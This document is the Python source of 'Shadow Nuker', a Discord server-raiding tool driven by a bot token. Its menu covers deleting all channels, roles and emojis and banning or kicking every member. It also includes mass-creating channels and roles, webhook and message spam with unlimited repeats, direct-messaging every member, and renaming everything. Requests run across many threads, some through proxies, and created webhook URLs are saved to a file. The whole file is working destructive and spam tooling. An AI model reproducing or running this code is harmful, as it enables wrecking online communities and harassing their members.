```
# SHADOW NUKER BY YUP-CONSOLE

# CHECKING FOR REQUIREMENTS.

import sys, os
import requests as req, time, json
from pystyle import *
from colorama import Fore, init
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import asyncio
from random import choice as choisex

# Initialize colorama for cross-platform color support
init()

# =============================== CLASSES =========================================

from Plugins.logger import Logger
from Plugins.tools import Tools
from Plugins.nuking import Nuking
from Plugins.funcs import Funcs
from Plugins.colors import Palette

# =============================== SOME VARS ==================================

global_timeout = 0.1  # Increased timeout to respect rate limits
palette = Palette()
token = None
names = None
amount = None
guild_name = None
invite_link = None
max_threads = 10  # Limit concurrent threads to avoid rate limits

# ============================== MAIN CODE ==========================================

info = None

async def main(token: str, guild_id):
    headers = {"Authorization": "Bot %s" % token, "Content-Type": 'application/json'}
    System.Clear()
    Funcs.print_logo()
    global info
    
    if not info:
        info = Tools.information(guild_id, token)

    menu = """
> github.com/yup-console/Shadow-Nuker

01. Delete All Channels    07. Webhook Spam Guild     13. Change Guild Name
02. Delete All Roles       08. Message Spam Guild     14. Remove All Emojis
03. Ban All Members        09. Rename All Channels    15. DM All Members
04. Kick All Members       10. Rename All Roles       16. Unban All Members
05. Create Channels        11. Nick All Users         17. Exit
06. Create Roles           12. UnNick All Users

"""

    async def back_to_menu():
        input(f"{Fore.RED}\n!! IF YOU WANT TO RETURN TO THE MAIN MENU, PRESS ENTER !!{Fore.CYAN}\n")
        return await main(token, guild_id)

    nuker = Nuking(token, guild_id)

    print(Colorate.Vertical(Colors.DynamicMIX((Col.light_blue, Col.cyan)), menu))
    print()  # Adds a blank line for spacing
    num = lambda n: "0"+n if len(n) != 2 else n
    choice = Funcs.get_input(
        f"{Fore.BLUE}Shadow Nuker > ",
        checker=lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 17
    )
    choice = num(choice)

    print()

    # Delete all channels
    if choice == "01":
        url = Tools.api("guilds/%s/channels" % guild_id)
        request = req.get(url, headers=headers, proxies=Tools.proxy())

        if request.status_code != 200:
            Logger.Error.error(f"Failed to fetch channels with status code: {request.status_code}")
            return await back_to_menu()
        
        channels = [i["id"] for i in request.json()]

        def deleter(channel_id):
            if nuker.delete_channel(channel_id):
                Logger.Success.delete(channel_id)
            else:
                Logger.Error.delete(channel_id)
        
        Logger.Log.started()

        threads = []
        for channel in channels:
            t = Thread(target=deleter, args=(channel,))
            t.start()
            threads.append(t)
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()

    # Delete all roles
    elif choice == "02":
        url = Tools.api("guilds/%s/roles" % guild_id)
        request = req.get(url, headers=headers)

        if request.status_code != 200:
            Logger.Error.error(f"Failed to fetch roles with status code: {request.status_code}")
            return await back_to_menu()
        
        roles = [i["id"] for i in request.json()]

        def delete_role(role):
            status = nuker.delete_role(role)
            if status:
                Logger.Success.delete(role)
            else:
                Logger.Error.delete(role)

        Logger.Log.started()

        threads = []
        for role in roles:
            t = Thread(target=delete_role, args=(role,))
            t.start()
            threads.append(t)
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()

    # Mass ban members
    elif choice == "03":
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)
        
        Logger.Log.started()

        def ban(member):
            try:
                if nuker.ban(member):
                    Logger.Success.success(f"Banned {Fore.CYAN}{member}")
                else:
                    Logger.Error.error(f"Failed to ban {Fore.BLUE}{member}")
            except Exception as e:
                Logger.Error.error(f"Error banning {member}: {str(e)}")
            time.sleep(global_timeout)  # Respect rate limits

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(ban, users)

        return await back_to_menu()

    # Mass kick members
    elif choice == "04":
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)
        
        Logger.Log.started()

        def kick(member):
            try:
                if nuker.kick(member):
                    Logger.Success.success(f"Kicked {Fore.CYAN}{member}")
                else:
                    Logger.Error.error(f"Failed to kick {Fore.BLUE}{member}")
            except Exception as e:
                Logger.Error.error(f"Error kicking {member}: {str(e)}")
            time.sleep(global_timeout)  # Respect rate limits

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(kick, users)

        return await back_to_menu()

    # Mass create channels
    elif choice == "05":
        name = Funcs.get_input("Enter a name for channels: ", lambda x: len(x) < 100 and x != "")
        count = Funcs.get_input("How many channels do you want to create? [1,500]: ", lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 500)
        count = int(count)
        channel_type = Funcs.get_input("Enter the type of the channels: [text, voice]: ", lambda x: x.lower().strip() in ["text", "voice"])

        types = {"voice": 2, "text": 0}

        Logger.Log.started()

        def create(name, channel_type):
            status = nuker.create_channel(name, channel_type)
            if status:
                Logger.Success.create(status)
            else:
                Logger.Error.create(name)

        threads = []
        for _ in range(count):
            t = Thread(target=create, args=(name, types[channel_type]))
            t.start()
            threads.append(t)
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()

    # Mass create roles
    elif choice == "06": 
        name = Funcs.get_input("Enter a name for roles: ", lambda x: len(x) < 100 and x != "")
        count = Funcs.get_input("How many roles do you want to create? [1,250]: ", lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 250)
        count = int(count)

        Logger.Log.started()

        def create(name):
            status = nuker.create_role(name)
            if status:
                Logger.Success.create(status)
            else:
                Logger.Error.create(name)
            
        threads = []
        for _ in range(count):
            t = Thread(target=create, args=(name,))
            t.start()
            threads.append(t)
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()
        
    # Webhook spam guild
    elif choice == "07":
        url = Tools.api("/guilds/%s/channels" % guild_id)
        message = Funcs.get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
        count = Funcs.get_input("How many times do you want to send this message? [1, ∞]: ", lambda x: x.isnumeric() and int(x) != 0)

        request = req.get(url, headers=headers)
        if not request.status_code == 200:
            Logger.Error.error(f"There was an error while fetching channels: {request.status_code}")
            return await back_to_menu()

        channels = [i["id"] for i in request.json()]
        
        chunk_size = round(len(channels) / 2)

        def mass_webhook(channels):
            def create_webhook(channel):
                status = nuker.create_webhook(channel)
                if status:
                    Logger.Success.create(status)
                    with open("./Scraped/webhooks.txt", "a") as fp: fp.write(status+"\n")
                    Thread(target=nuker.send_webhook, args=(status, message, int(count))).start()
                else:
                    Logger.Error.error(f"Failed to create webhook from {Fore.BLUE}{channel}")

            for channel in channels:
                Thread(target=create_webhook, args=(channel,)).start()
                time.sleep(global_timeout)
        
        channels = Tools.chunker(channels, chunk_size)
        Logger.Log.started()

        threads = []
        for channel_list in channels:
            t = Thread(target=mass_webhook, args=(channel_list,))
            t.start()
            threads.append(t)
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()
        
    # Message spam guild
    elif choice == "08":
        url = Tools.api("/guilds/%s/channels" % guild_id)
        message = Funcs.get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
        count = Funcs.get_input("How many times do you want to send this message? [1, ∞]: ", lambda x: x.isnumeric() and int(x) != 0)

        request = req.get(url, headers=headers)
        if not request.status_code == 200:
            Logger.Error.error(f"There was an error while fetching channels: {request.status_code}")
            return await back_to_menu()

        channels = [i["id"] for i in request.json()]

        def send_message(channel, message):
            if nuker.send_message(channel, message):
                Logger.Success.success(f"Sent message in {Fore.CYAN}{channel}")
            else:
                Logger.Error.error(f"Failed to send message in {Fore.BLUE}{channel}")

        Logger.Log.started()

        threads = []
        for i in range(int(count)):
            for channel in channels:
                t = Thread(target=send_message, args=(channel, message))
                t.start()
                threads.append(t)
                time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()

    # Rename all channels
    elif choice == "09":
        url = Tools.api("/guilds/%s/channels" % guild_id)
        name = Funcs.get_input("Enter a name for channels: ", lambda x: len(x) <= 100 and x != "")  

        request = req.get(url, headers=headers)
        if not request.status_code == 200:
            Logger.Error.error(f"There was an error while fetching channels: {request.status_code}")
            return await back_to_menu()

        channels = [i["id"] for i in request.json()]
        
        def rename(channel_id, name):
            try:
                if nuker.rename_channel(name, channel_id):
                    Logger.Success.success(f"Renamed {Fore.CYAN}{channel_id}")
                else:
                    Logger.Error.error(f"Failed to rename {Fore.BLUE}{channel_id}")
            except Exception as e:
                Logger.Error.error(f"Error renaming {Fore.BLUE}{channel_id}: {str(e)}")
        
        Logger.Log.started()

        threads = []
        for channel in channels:
            t = Thread(target=rename, args=(channel, name))
            t.start()
            threads.append(t)
            time.sleep(global_timeout)  # Respect rate limits
        else:
            for thread in threads: thread.join()
            Logger.Success.success(f"Attempted to rename {len(channels)} channels")
            return await back_to_menu()
    
    # Rename all roles
    elif choice == "10":
        name = Funcs.get_input("Enter a name for roles: ", lambda x: len(x) <= 100 and x != "")
        url = Tools.api("guilds/%s/roles" % guild_id)

        request = req.get(url, headers=headers)
        if request.status_code != 200:
            Logger.Error.error(f"Failed to fetch roles with status code: {request.status_code}")
            return await back_to_menu()
        
        roles = [i["id"] for i in request.json()]

        def rename(role_id, name):
            if nuker.rename_role(role_id, name):
                Logger.Success.success(f"Renamed {Fore.CYAN}{role_id}")
            else:
                Logger.Error.error(f"Failed to rename {Fore.BLUE}{role_id}")

        Logger.Log.started()

        threads = []
        for role in roles:
            t = Thread(target=rename, args=(role, name))
            t.start()
            threads.append(t)
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()

    # Nick all users
    elif choice == "11":
        name = Funcs.get_input("Enter a nickname for members: ", lambda x: len(x) <= 100 and x != "")
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)

        def change(member, nick):
            if nuker.change_nick(member, nick):
                Logger.Success.success(f"Changed nickname for {Fore.CYAN}{member}")
            else:
                Logger.Error.error(f"Failed to change nickname for {Fore.BLUE}{member}")
        
        Logger.Log.started()

        threads = []
        for user in users:
            t = Thread(target=change, args=(user, name))
            threads.append(t)
            t.start()
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()
        
    # Unnick all users
    elif choice == "12":
        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)

        def change(member, nick):
            if nuker.change_nick(member, nick):
                Logger.Success.success(f"Changed nickname for {Fore.CYAN}{member}")
            else:
                Logger.Error.error(f"Failed to change nickname for {Fore.BLUE}{member}")
        
        Logger.Log.started()

        threads = []
        for user in users:
            t = Thread(target=change, args=(user, None))
            threads.append(t)
            t.start()
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()

    # Change guild name
    elif choice == "13":
        name = Funcs.get_input("Enter a nickname for guild: ", lambda x: len(x) <= 100 and x != "")

        Logger.Log.started()

        if nuker.rename_guild(name):
            Logger.Success.success(f"Changed Guild name to {Fore.CYAN}{name}")
        else:
            Logger.Error.error(f"Failed to change name")

        return await back_to_menu()
    
    # Remove all emojis
    elif choice == "14":
        url = Tools.api(f"guilds/{guild_id}/emojis")
        request = req.get(url, headers=headers)

        if not request.status_code == 200:
            Logger.Error.error(f"There was an error while fetching guild emojis")
            return await back_to_menu()
        
        emojis = [[i["id"], i["name"]] for i in request.json()]

        Logger.Log.started()

        for id, name in emojis:
            if nuker.remove_emoji(id):
                Logger.Success.delete(f"{Fore.CYAN}{id} - {name}")
            else:
                Logger.Error.delete(f"{Fore.BLUE}{id} - {name}")
        else:
            return await back_to_menu()

    # DM all members
    elif choice == "15":
        message = Funcs.get_input("Enter a message to send to their direct message: ", lambda x: x != "" and len(x) <= 4000)

        api = Tools.api("/guilds/%s/members" % guild_id)
        users = await Tools.break_limit(api, token)

        def send_dm(user, message):
            try:
                if nuker.send_direct_message(user, message):
                    Logger.Success.success(f"Sent DM to {Fore.CYAN}{user}")
                else:
                    Logger.Error.error(f"Failed to send direct message to {Fore.BLUE}{user}")
            except Exception as e:
                Logger.Error.error(f"Error sending DM to {user}: {str(e)}")
            time.sleep(global_timeout + 0.5)

        Logger.Log.started()

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(lambda u: send_dm(u, message), users)

        return await back_to_menu()
        
    # Unban all members
    elif choice == "16":
        url = Tools.api(f"/guilds/{guild_id}/bans")
        banned_users = await Tools.break_limit(url, token)

        Logger.Log.started()

        def unban(member):
            if nuker.unban(member):
                Logger.Success.success(f"Unbanned {Fore.CYAN}{member}")
            else:
                Logger.Error.error(f"Failed to unban {Fore.BLUE}{member}")

        threads = []
        for banned in banned_users:
            t = Thread(target=unban, args=(banned,))
            t.start()
            threads.append(t)
            time.sleep(global_timeout)
        else:
            for thread in threads: thread.join()
            return await back_to_menu()
        
    # Exit
    elif choice == "17":
        os._exit(69)

# ===================== RUNNING IT UP ================================

def start(args):
    global token, names, amount, invite_link, guild_name

    # Checking for any session files
    if len(args) != 1:
        if args[1].endswith(".json") and os.path.exists(args[1]):
            with open(args[1], "r", encoding="utf8") as fp:
                j = json.loads(fp.read())
            
            _in = lambda t: j[t] if t in str(j) else None

            token = _in("Token")
            names = _in("SpamTexts")
            amount = _in("SpamAmount")
            guild_name = _in("ServerName")
            invite_link = _in("SpamInviteLink")

    System.Clear()
    System.Title("Shadow Nuker - github.com/yup-console/Shadow-Nuker")
    System.Size(160, 40)

    if not token:
        token = Funcs.get_input("Please Enter your token: ", lambda x: x != "" and not x.isnumeric() and Tools.check_token(x))
    else:
        if not Tools.check_token(token):
            token = Funcs.get_input("Please Enter your token: ", lambda x: x != "" and not x.isnumeric() and Tools.check_token(x))
    
    print()

    guilds = Tools.get_guilds(token)
    num = 1
    
    _guilds = {}

    for id, name in guilds:
        print(palette.sky_blue, num, palette.sexy_blue, end="- ")
        print(palette.magenta, id, palette.grey, name)
        _guilds[str(num)] = id
        num += 1
    
    print()
    guild = Funcs.get_input("Please Enter the guild id or its number: ", lambda x: x.isnumeric() and (x in str(_guilds) or x in Tools.get_guilds(token)[0]))

    if _guilds.get(str(guild)):
        guild = _guilds[guild]

    asyncio.run(main(token, guild))

if __name__ == "__main__":
    args = sys.argv
    start(args)
```